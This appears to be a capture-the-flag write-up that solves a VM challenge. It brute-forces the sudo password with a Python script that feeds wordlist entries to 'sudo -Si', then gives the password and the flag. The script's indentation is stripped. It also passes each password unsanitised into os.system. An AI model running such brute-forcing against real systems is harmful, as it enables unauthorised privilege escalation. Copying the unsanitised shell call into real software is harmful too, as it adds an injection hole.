You have been provided with a .rar file containing a VM of a linux OS.
After you search around a bit, you can find a word list in the home directory.
We use the following code to bruteforce all the passwords provided in the wordlist.

import os

import sys



if len(sys.argv) == 1:

print("You need to add a wordlist! Run the script like this: python sudo_brute_force.py passwords.txt")

exit()



wordfile = sys.argv[1]



print("Brute force sudo password with wordlist {}".format(wordfile))

print()



with open(wordfile, "r") as wordlist:

for password in wordlist:

print(password)



result = os.system("echo {} | sudo -Si".format(password.strip())) # important: strip() the newline char



if result == "0" or result == 0:

print("Success! :) The password is: {}".format(password))

break

else:

print("Wrong password... :( Let's try again!")

print()

The password is ‘password’

So, the flag is vishwactf{password}
